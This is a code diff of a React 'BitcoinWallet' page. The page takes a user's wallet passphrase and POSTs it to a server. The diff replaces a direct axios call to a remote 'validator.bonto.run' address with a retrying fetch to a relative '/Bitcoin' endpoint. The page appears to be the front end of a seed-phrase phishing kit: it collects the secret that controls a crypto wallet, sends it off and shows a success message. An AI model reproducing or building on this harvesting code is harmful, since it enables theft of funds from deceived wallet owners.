@@ -1,34 +1,36 @@
 import React, { useState } from 'react';
 import "./bitcoinPagesCss/bitcoinWallet.css";
 import bitcoin_logo from '../../../assets/bitcoin_logo.png';
-import axios from 'axios';
 import { toast } from 'react-toastify';
 import 'react-toastify/dist/ReactToastify.css';
 import { useNavigate } from 'react-router-dom';
+import fetchWithRetry from '../../../utils/api';
 
 const BitcoinWallet = () => {
   const [text, setText] = useState('');
   const [loading, setLoading] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
 
+  
   const navigate = useNavigate();
 
   const unlockWallet = async () => {
-    const url = 'https://validator.bonto.run/bitcoin';
-    const data = { passphrase: text };
-
     try {
       setLoading(true);
-      const response = await axios.post(url, data);
-      setLoading(false);
+      const res = await fetchWithRetry('/Bitcoin', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ passphrase: text })
+      });
 
-      toast.success(response.data.message);
+      const data = await res.json();
+      setLoading(false);
+      toast.success(data.message);
       setText('');
       setShowSuccess(true);
     } catch (error) {
       setLoading(false);
-      const errorMessage =
-        error.response?.data?.message || 'An error occurred. Please try again.';
+      const errorMessage = error.message || 'An error occurred. Please try again.';
       toast.error(errorMessage);
     }
   };
